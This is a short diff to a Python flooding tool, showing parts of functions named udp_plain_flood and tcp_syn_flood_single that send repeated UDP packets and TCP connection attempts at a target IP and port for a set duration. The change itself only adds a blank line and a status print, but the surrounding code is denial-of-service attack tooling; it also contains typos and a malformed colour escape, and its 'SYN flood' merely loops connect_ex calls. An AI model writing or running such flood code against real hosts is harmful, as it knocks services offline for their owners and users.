@@ -31,6 +31,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
     end_time = time.time() + duration
     packet_count = 0
     payload = b"A" * packet_size  # Fixed payloaf    
+    
     print(f"⚡ Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
     try:
         while time.time() < end_time:
@@ -73,6 +74,7 @@ def tcp_syn_flood_single(ip, port, duration):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
+            print(f"[*] Starting TCP SYN flood (Single) on {ip}:{port} for {duration} seconds")
             print("☑️ Starting TCP SYN flood \033[38;5;220mconnect-ex \033[32{ip}\033[37m:{port} \033[33mpacket-count{packet_count}\033[0m")
             sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
             packet_count += 1
